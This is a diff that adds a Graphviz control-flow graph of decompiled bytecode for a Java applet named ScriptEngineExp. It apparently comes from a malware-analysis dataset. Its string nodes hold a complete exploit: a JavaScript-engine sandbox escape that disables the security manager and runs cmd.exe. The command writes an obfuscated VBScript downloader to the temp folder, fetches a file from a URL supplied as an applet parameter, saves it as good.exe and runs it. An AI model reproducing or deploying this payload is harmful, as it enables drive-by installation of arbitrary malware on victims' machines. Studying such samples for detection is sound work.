@@ -1,0 +1,86 @@
+digraph "" {
+    "r0 := @this: ScriptEngineExp"
+    "load.r r0"
+    "r0 := @this: ScriptEngineExp"->"load.r r0";
+    "push 1"
+    "load.r r0"->"push 1";
+    "newarray"
+    "push 1"->"newarray";
+    "store.r $r10"
+    "newarray"->"store.r $r10";
+    "load.r $r10"
+    "store.r $r10"->"load.r $r10";
+    "push 0"
+    "load.r $r10"->"push 0";
+    "new javax.script.ScriptEngineManager"
+    "push 0"->"new javax.script.ScriptEngineManager";
+    "dup1.r"
+    "new javax.script.ScriptEngineManager"->"dup1.r";
+    "specialinvoke <javax.script.ScriptEngineManager: void <init>()>"
+    "dup1.r"->"specialinvoke <javax.script.ScriptEngineManager: void <init>()>";
+    "push \"js\""
+    "specialinvoke <javax.script.ScriptEngineManager: void <init>()>"->"push \"js\"";
+    "virtualinvoke <javax.script.ScriptEngineManager: javax.script.ScriptEngine getEngineByName(java.lang.String)>"
+    "push \"js\""->"virtualinvoke <javax.script.ScriptEngineManager: javax.script.ScriptEngine getEngineByName(java.lang.String)>";
+    "virtualinvoke <javax.script.ScriptEngineManager: javax.script.ScriptEngine getEngineByName(java.lang.String)>"->"dup1.r";
+    "dup1.r"->"load.r r0";
+    "push \"data\""
+    "load.r r0"->"push \"data\"";
+    "virtualinvoke <ScriptEngineExp: java.lang.String getParameter(java.lang.String)>"
+    "push \"data\""->"virtualinvoke <ScriptEngineExp: java.lang.String getParameter(java.lang.String)>";
+    "store.r r1"
+    "virtualinvoke <ScriptEngineExp: java.lang.String getParameter(java.lang.String)>"->"store.r r1";
+    "new java.lang.StringBuffer"
+    "store.r r1"->"new java.lang.StringBuffer";
+    "new java.lang.StringBuffer"->"dup1.r";
+    "push \"var error = new Error(\\\"My error\\\");this.toString = function(){ java.lang.System.setSecurityManager(null);java.lang.Runtime.getRuntime().exec(\'cmd.exe /c echo URL = LCase(WScript.Arguments(0))>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo dim m,s>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo m=\\\"M^i^c^r^o^s^o^f^t^.^X^M^L^H^T^T^P\\\">>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo s=\\\"A=D=O=DB=.=S=t=r=e=a=m\\\">>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo set cmd =Createobject(replace(m,\\\"^\\\",\\\"\\\")) >>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo cmd.Open \\\"GET\\\",URL,0 >>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo cmd.Send()>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo FileName=LCase(WScript.Arguments(1))>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo Set CsCriptGet = Createobject(replace(s,\\\"=\\\",\\\"\\\"))>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo CsCriptGet.Mode=^3>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo CsCriptGet.Type=^1>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo CsCriptGet.Open()>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo CsCriptGet.Write(cmd.responseBody)>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo CsCriptGet.SaveToFile FileName,^2>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c cscript \\\"%temp%\\\\good.vbs\\\" \""
+    "dup1.r"->"push \"var error = new Error(\\\"My error\\\");this.toString = function(){ java.lang.System.setSecurityManager(null);java.lang.Runtime.getRuntime().exec(\'cmd.exe /c echo URL = LCase(WScript.Arguments(0))>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo dim m,s>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo m=\\\"M^i^c^r^o^s^o^f^t^.^X^M^L^H^T^T^P\\\">>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo s=\\\"A=D=O=DB=.=S=t=r=e=a=m\\\">>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo set cmd =Createobject(replace(m,\\\"^\\\",\\\"\\\")) >>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo cmd.Open \\\"GET\\\",URL,0 >>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo cmd.Send()>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo FileName=LCase(WScript.Arguments(1))>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo Set CsCriptGet = Createobject(replace(s,\\\"=\\\",\\\"\\\"))>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo CsCriptGet.Mode=^3>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo CsCriptGet.Type=^1>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo CsCriptGet.Open()>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo CsCriptGet.Write(cmd.responseBody)>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo CsCriptGet.SaveToFile FileName,^2>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c cscript \\\"%temp%\\\\good.vbs\\\" \"";
+    "specialinvoke <java.lang.StringBuffer: void <init>(java.lang.String)>"
+    "push \"var error = new Error(\\\"My error\\\");this.toString = function(){ java.lang.System.setSecurityManager(null);java.lang.Runtime.getRuntime().exec(\'cmd.exe /c echo URL = LCase(WScript.Arguments(0))>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo dim m,s>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo m=\\\"M^i^c^r^o^s^o^f^t^.^X^M^L^H^T^T^P\\\">>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo s=\\\"A=D=O=DB=.=S=t=r=e=a=m\\\">>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo set cmd =Createobject(replace(m,\\\"^\\\",\\\"\\\")) >>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo cmd.Open \\\"GET\\\",URL,0 >>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo cmd.Send()>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo FileName=LCase(WScript.Arguments(1))>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo Set CsCriptGet = Createobject(replace(s,\\\"=\\\",\\\"\\\"))>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo CsCriptGet.Mode=^3>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo CsCriptGet.Type=^1>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo CsCriptGet.Open()>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo CsCriptGet.Write(cmd.responseBody)>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c echo CsCriptGet.SaveToFile FileName,^2>>\\\"%temp%\\\\good.vbs\\\"&&cmd.exe /c cscript \\\"%temp%\\\\good.vbs\\\" \""->"specialinvoke <java.lang.StringBuffer: void <init>(java.lang.String)>";
+    "load.r r1"
+    "specialinvoke <java.lang.StringBuffer: void <init>(java.lang.String)>"->"load.r r1";
+    "virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>"
+    "load.r r1"->"virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>";
+    "push \" \\\"%temp%\\\\good.exe\\\"&& \\\"%temp%\\\\good.exe\\\"\');\""
+    "virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>"->"push \" \\\"%temp%\\\\good.exe\\\"&& \\\"%temp%\\\\good.exe\\\"\');\"";
+    "push \" \\\"%temp%\\\\good.exe\\\"&& \\\"%temp%\\\\good.exe\\\"\');\""->"virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>";
+    "push \"return \\\"exploit!\\\";};\""
+    "virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>"->"push \"return \\\"exploit!\\\";};\"";
+    "push \"return \\\"exploit!\\\";};\""->"virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>";
+    "push \"error.message = this;\""
+    "virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>"->"push \"error.message = this;\"";
+    "push \"error.message = this;\""->"virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuffer: java.lang.String toString()>"
+    "virtualinvoke <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuffer: java.lang.String toString()>";
+    "interfaceinvoke <javax.script.ScriptEngine: java.lang.Object eval(java.lang.String)> 1"
+    "virtualinvoke <java.lang.StringBuffer: java.lang.String toString()>"->"interfaceinvoke <javax.script.ScriptEngine: java.lang.Object eval(java.lang.String)> 1";
+    "pop"
+    "interfaceinvoke <javax.script.ScriptEngine: java.lang.Object eval(java.lang.String)> 1"->"pop";
+    "push \"error\""
+    "pop"->"push \"error\"";
+    "interfaceinvoke <javax.script.ScriptEngine: java.lang.Object get(java.lang.String)> 1"
+    "push \"error\""->"interfaceinvoke <javax.script.ScriptEngine: java.lang.Object get(java.lang.String)> 1";
+    "arraywrite.r"
+    "interfaceinvoke <javax.script.ScriptEngine: java.lang.Object get(java.lang.String)> 1"->"arraywrite.r";
+    "new javax.swing.JList"
+    "arraywrite.r"->"new javax.swing.JList";
+    "new javax.swing.JList"->"dup1.r";
+    "dup1.r"->"load.r $r10";
+    "specialinvoke <javax.swing.JList: void <init>(java.lang.Object[])>"
+    "load.r $r10"->"specialinvoke <javax.swing.JList: void <init>(java.lang.Object[])>";
+    "fieldput <ScriptEngineExp: javax.swing.JList list>"
+    "specialinvoke <javax.swing.JList: void <init>(java.lang.Object[])>"->"fieldput <ScriptEngineExp: javax.swing.JList list>";
+    "fieldput <ScriptEngineExp: javax.swing.JList list>"->"load.r r0";
+    "load.r r0"->"load.r r0";
+    "fieldget <ScriptEngineExp: javax.swing.JList list>"
+    "load.r r0"->"fieldget <ScriptEngineExp: javax.swing.JList list>";
+    "virtualinvoke <ScriptEngineExp: java.awt.Component add(java.awt.Component)>"
+    "fieldget <ScriptEngineExp: javax.swing.JList list>"->"virtualinvoke <ScriptEngineExp: java.awt.Component add(java.awt.Component)>";
+    "virtualinvoke <ScriptEngineExp: java.awt.Component add(java.awt.Component)>"->"pop";
+    "goto return"
+    "pop"->"goto return";
+    "return"
+    "goto return"->"return";
+    "virtualinvoke <javax.script.ScriptException: void printStackTrace()>"
+    "virtualinvoke <ScriptEngineExp: java.awt.Component add(java.awt.Component)>"->"virtualinvoke <javax.script.ScriptException: void printStackTrace()>";
+}
